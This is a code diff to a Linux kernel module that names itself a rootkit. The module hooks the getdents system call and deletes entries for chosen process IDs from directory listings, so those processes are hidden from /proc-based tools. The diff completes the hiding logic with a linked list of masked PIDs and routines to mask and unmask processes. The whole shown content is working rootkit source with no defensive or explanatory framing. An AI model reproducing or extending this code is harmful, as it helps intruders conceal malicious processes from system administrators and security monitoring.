@@ -23,6 +23,7 @@
 
 #include <linux/syscalls.h>		/* Needed for __NR_getdents */
 #include <linux/namei.h>		/* Needed for kern_path & LOOKUP_FOLLOW */
+#include <linux/slab.h>			/* Needed for kmalloc & kfree */
 
 
 /*******************************************************************************/
@@ -37,7 +38,6 @@
 #define DEBUG_PRINT(str) if (show_debug_messages) PRINT(str)
 #define PRINT_PID(pid) printk(KERN_INFO "rootkit process_masking: masking process %d\n", (pid))
 #define DEBUG_PRINT_PID(pid) if (show_debug_messages) PRINT_PID(pid)
-#define PIDS_BUFFSIZE 8   //TODO: to be deleted
 
 
 /* Definition of data structs */
@@ -48,13 +48,17 @@ struct linux_dirent {
 	char d_name[];
 };
 
+struct masked_process {   /* List to keep hidden processes */
+	struct list_head list;
+	pid_t pid;
+};
+
 
 /* Definition of global variables */
 static int show_debug_messages;
 static unsigned long proc_ino;
 asmlinkage int (*pm_original_getdents_syscall)(unsigned int, struct linux_dirent *, unsigned int);   //TODO: should point to original_getdents
-static int pids[PIDS_BUFFSIZE];   //TODO: to be deleted
-static int pids_count;   //TODO: to be deleted
+static struct list_head masked_processes;
 
 
 /* Declaration of functions */
@@ -63,11 +67,12 @@ int process_masking_exit(void);
 
 asmlinkage int process_masking_getdents_syscall(unsigned int, struct linux_dirent *, unsigned int);
 
-void mask_process(pid_t);
-void unmask_process(pid_t);
+int mask_process(pid_t);
+int unmask_process(pid_t);
 
 static unsigned long get_inode_no(char *);
-static int should_mask(pid_t);
+static int process_is_masked(pid_t);
+static void delete_masked_processes(void);
 
 
 /*******************************************************************************/
@@ -86,6 +91,8 @@ int process_masking_init(int debug_mode_on)
 	if (proc_ino < 0)
 		return 1;
 
+	INIT_LIST_HEAD(&masked_processes);
+
 	DEBUG_PRINT("initialized");
 
 	return 0;
@@ -94,6 +101,8 @@ int process_masking_init(int debug_mode_on)
 
 int process_masking_exit(void)
 {
+	delete_masked_processes();
+
 	DEBUG_PRINT("exited");
 
 	return 0;
@@ -121,7 +130,7 @@ asmlinkage int process_masking_getdents_syscall(unsigned int fd, struct linux_di
 		nread_temp -= dirp->d_reclen;
 
 		pid = simple_strtol(dirp->d_name, &endptr, 10);
-		if (pid && should_mask(pid)) {
+		if (pid && process_is_masked(pid)) {
 			DEBUG_PRINT_PID(pid);
 			memmove(dirp, (char *) dirp + dirp->d_reclen, nread_temp);
 			nread -= dirp->d_reclen;
@@ -138,15 +147,42 @@ asmlinkage int process_masking_getdents_syscall(unsigned int fd, struct linux_di
 }
 
 
-void mask_process(pid_t pid)
+int mask_process(pid_t pid)
 {
-	//TODO: to be implemented
+	struct masked_process *new;
+
+	if (process_is_masked(pid))
+		return -1;
+
+	if ((new = kmalloc(sizeof(struct masked_process), GFP_KERNEL)) == NULL)
+		return -ENOMEM;
+
+	new->pid = pid;
+
+	list_add(&new->list, &masked_processes);
+
+	printk(KERN_INFO "rootkit process_masking: process_is_masked - %d\n", process_is_masked(pid));
+
+	return 0;
 }
 
 
-void unmask_process(pid_t pid)
+int unmask_process(pid_t pid)
 {
-	//TODO: to be implemented
+	struct masked_process *cur;
+	struct list_head *cursor, *next;
+
+	list_for_each_safe(cursor, next, &masked_processes) {
+		cur = list_entry(cursor, struct masked_process, list);
+		if (cur->pid == pid) {
+			list_del(cursor);
+			kfree(cur);
+
+			return 0;
+		}
+	}
+
+	return -EINVAL;
 }
 
 
@@ -168,15 +204,31 @@ static unsigned long get_inode_no(char *path_name)
 
 
 /* Function that checks whether we need to mask the specified pid */
-//TODO: to be updated
-static int should_mask(pid_t pid)
+static int process_is_masked(pid_t pid)
 {
-	int i;
+	struct masked_process *cur;
+	struct list_head *cursor;
 
-	for (i=0 ; i<pids_count ; i++)
-		if (pids[i] == pid)
+	list_for_each(cursor, &masked_processes) {
+		cur = list_entry(cursor, struct masked_process, list);
+		if (cur->pid == pid)
 			return 1;
+	}
 
 	return 0;
+}
+
+
+static void delete_masked_processes(void)
+{
+	struct list_head *cursor, *next;
+	struct masked_process *masked_process_ptr;
+
+	cursor = next = NULL;
+	list_for_each_safe(cursor, next, &masked_processes) {
+		masked_process_ptr = list_entry(cursor, struct masked_process, list);
+		list_del(cursor);
+		kfree(masked_process_ptr);
+	}
 }
 
